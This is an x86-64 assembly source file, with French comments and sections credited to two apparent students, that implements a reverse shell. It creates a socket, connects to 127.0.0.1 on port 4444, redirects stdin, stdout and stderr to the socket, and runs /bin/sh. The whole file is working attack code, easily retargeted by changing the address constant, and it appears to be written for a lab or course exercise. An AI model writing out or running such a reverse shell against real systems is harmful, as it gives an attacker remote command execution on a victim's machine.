; Variables pour bash

section .data
cmd db '/bin/sh',0

section .text
global _start

; Commencement du Reverse en ASM
; Création du socket

; PARTIE JULIEN DEBUT ;

_start:
    ; socket syscall
    mov al, 41  ; sys_socket
    xor rdi, rdi
    add rdi, 2   ; AF_INET
    xor rsi, rsi
    add rsi, 1   ; SOCK_STREAM
    xor rdx, rdx ; protocol 0 (IP)
    syscall

    ; On deplace le descripteur de socket de rax -> rdi
    mov r9, rax

    ; Creation de la connection pour le socket

   push 0x2a
   pop rax   ; rdi -> fd
   mov rdi, r9   ; Creation de la structure du socket
   push rdx         ; pushing padding
   push rdx         ; pushing padding
   push 0x0101017f  ; Addresse (127.0.0.1)
   push word 0x5c11 ; PORT (4444)
   push word 0x02   ; AF_INET (2)   ; rsi -> addresse dans la strctur addrin
   mov rsi, rsp   ; rdx -> 16
   add rdx, 0x10   ; Execution du syscall
   syscall

    ; dup2 syscall for stdin, stdout, stderr
    xor rsi, rsi
    mov sil, 2

 ; PARTIE JULIEN FIN ;

 ; PARTIE ALEXY DEBUT ;


.loop:
    xor rax, rax
    mov al, 0x21  ; sys_dup2 (Pourquoi remplacer ca par l'instruction en dessous ?)
    syscall
    dec rsi
    jge .loop


    xor rax, rax
    xor rdx, rdx
    mov rbx, 0x68732f6e69622f2f
    push rax                    ; IMPORTANT 
    push rbx                    ; on met rbx sur la stack
    mov rdi, rsp                ; on stock l'adresse de rbx (qui viens d'etre push) dans rdi (arg1)
    push rax
    push rdi
    mov rsi, rsp                ; stock de la stack dans rsi (arg2)
    mov al, 0x3b                ; num syscall de execve
    syscall

    ; exit syscall
    mov al, 60  ; sys_exit
    xor rdi, rdi
    syscall